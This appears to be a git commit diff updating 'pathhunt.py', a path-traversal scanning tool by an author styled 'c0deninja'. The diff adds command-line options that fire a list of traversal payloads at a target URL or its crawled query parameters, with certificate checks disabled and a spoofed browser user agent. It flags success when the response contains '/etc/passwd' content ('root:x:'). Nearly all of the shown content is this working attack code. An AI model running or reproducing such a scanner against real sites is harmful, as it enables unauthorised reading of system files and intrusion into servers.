e30c0cdf37b755e8b6d18876e989e53e53342738
gotr00t0day <48636787+gotr00t0day@users.noreply.github.com>
2023-04-14 10:00:49 -0400

    Update pathhunt.py

--- pathhunt.py
+++ pathhunt.py
@@ -4,6 +4,7 @@ import requests
 import re
 import sys
 import os
+import argparse
 
 requests.packages.urllib3.disable_warnings()
 
@@ -11,7 +12,7 @@ requests.packages.urllib3.disable_warnings()
 user_agent_ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
 header = {"User-Agent": user_agent_}
 
-banner = """
+banner = f"""
 
 
  ██▓███   ▄▄▄     ▄▄▄█████▓ ██░ ██  ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓
@@ -22,21 +23,50 @@ banner = """
 ▒▓▒░ ░  ░ ▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒ ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   
 ░▒ ░       ▒   ▒▒ ░   ░     ▒ ░▒░ ░ ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░    
 ░░         ░   ▒    ░       ░  ░░ ░ ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░      
-               ░  ░         ░  ░  ░ ░  ░  ░   ░              ░   V1.0       
+               ░  ░         ░  ░  ░ ░  ░  ░   ░              ░   V1.1       
                                                                         
-by c0deninja
+{Fore.MAGENTA}by c0deninja
 """
 
-def path_traversal_scan(domain: str) -> str:
+print(f"{Fore.LIGHTBLACK_EX}{banner}")
+
+parser = argparse.ArgumentParser()
+
+parser.add_argument('-t', '--target',
+                   help="Target to scan",
+                   metavar="https://www.domain.com")
+parser.add_argument('-p', '--parameters',
+                   help="Target to scan",
+                   metavar="https://www.domain.com")
+
+args = parser.parse_args()
+
+if args.target:
+    cdir = os.getcwd()
+    with open(f"{cdir}/payloads/traversal.txt", "r") as f:
+        path_traversal_list = [x.strip() for x in f.readlines()]
+    vulnerable = []
+    for path_traversal in path_traversal_list:
+        s = requests.Session()
+        r = s.get(f"{args.target}{path_traversal}", verify=False, headers=header)
+        if r.status_code == 200 and "root:x:" in r.text:
+            vulnerable.append(f"{args.target}{path_traversal}")
+        else:
+            print(f"{Fore.RED}[-] {Fore.GREEN}{args.target}{Fore.CYAN}{path_traversal}")
+    if vulnerable:
+        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Path_Traversal: {Fore.GREEN}{', '.join(map(str,vulnerable))}")
+
+
+if args.parameters:
     try:
         s = requests.Session()
-        r = s.get(domain, verify=False, headers=header)
+        r = s.get(args.parameters, verify=False, headers=header)
         content = r.content
         links = re.findall('(?:href=")(.*?)"', content.decode('utf-8'))
         duplicatelinks = set(links)
         params_links = []
         for link in links:
-            link = urljoin(domain, link)
+            link = urljoin(args.parameters, link)
             if link not in duplicatelinks:
                 if "=" in link:
                     params_links.append(link + "\n")
@@ -46,7 +76,7 @@ def path_traversal_scan(domain: str) -> str:
             parameters = params2.split("=")[0]
             parameters_list.append(f"{parameters}=")
         cdir = os.getcwd()
-        with open(f"{cdir}/payloads/traversal.txt", "r") as f:
+        with open(f"{cdir}/utils/payloads/traversal.txt", "r") as f:
             path_traversal_list = [x.strip() for x in f.readlines()]
         for parameterslist in parameters_list:
             for path_list in path_traversal_list:
@@ -65,7 +95,3 @@ def path_traversal_scan(domain: str) -> str:
         print (Fore.RED + "Connection Error")
     except requests.exceptions.MissingSchema:
         print (Fore.RED + "Please use: http://site.com")
-
-if __name__ == "__main__":
-    domain = sys.argv[1]
-    path_traversal_scan(domain)
